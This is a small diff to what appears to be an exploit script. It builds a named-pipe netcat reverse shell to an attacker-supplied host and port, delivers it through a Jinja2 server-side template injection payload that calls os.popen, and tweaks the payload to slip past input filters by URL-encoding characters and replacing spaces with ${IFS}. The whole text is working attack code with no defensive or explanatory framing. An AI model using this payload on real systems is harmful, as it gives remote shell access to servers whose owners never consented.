@@ -14,6 +14,6 @@ generate_form "${LHOST_FIELD}" "${SHELL_PORT_FIELD}"
 LHOST=${form_data["lhost"]}
 SHELL_PORT=${form_data["shell_port"]}
 
-SHELL="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ${LHOST} ${SHELL_PORT} >/tmp/f"
+SHELL="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>%261|nc ${LHOST} ${SHELL_PORT} >/tmp/f"
 
-execute_command "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('${SHELL}').read() }}"
+execute_command "{{self.__init__.__globals__.__builtins__.__import__('os').popen('${SHELL// /\$\{IFS\}}').read()}}"
